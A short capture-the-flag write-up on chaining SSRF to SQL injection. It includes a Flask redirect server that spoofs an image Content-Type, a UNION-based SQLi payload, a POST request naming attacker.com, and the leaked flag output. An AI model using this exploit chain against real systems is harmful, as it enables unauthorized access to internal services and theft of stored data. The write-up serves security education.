# SSRF to SQL injection

When you create a new listing, give it an image url that you control, that redirects the server to http://127.0.0.1:5000/api/users?username=

This is because the api routes in the code are whitelisted with @localhost_only
It also looks for the Content-Type header to make sure it contains the word 'image'
The username parameter is vuln to SQLi

Example of malicious flask server:
```
from flask import Flask, redirect, Response

app = Flask(__name__)

@app.route('/redirect.png')
def redirect_to_internal():
    response = Response()
    response.headers['Content-Type'] = 'image'
    response.headers['Location'] = 'http://127.0.0.1:5000/api/users?username=%27%20OR%201=1%20UNION%20SELECT%20NULL,flag,NULL%20FROM%20flag%20limit%201%20%2d%2d%2d'
    response.status_code = 302
    return response

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

## exploiting
```
SQLi payload url-decoded:
' OR 1=1 UNION SELECT NULL,flag,NULL FROM flag limit 1 ---

POST to /create with your malicious image url
name=test123&description=test123&image_url=http%3A%2F%2Fattacker.com%3A8000%2Fredirect.png

Then you should get an error that looks like:
Invalid image URL. Please provide a valid image URL. Response was: [ { "id": null, "username": "SIVUSCG{whoopsies_SSRF_here!}" } ]
```
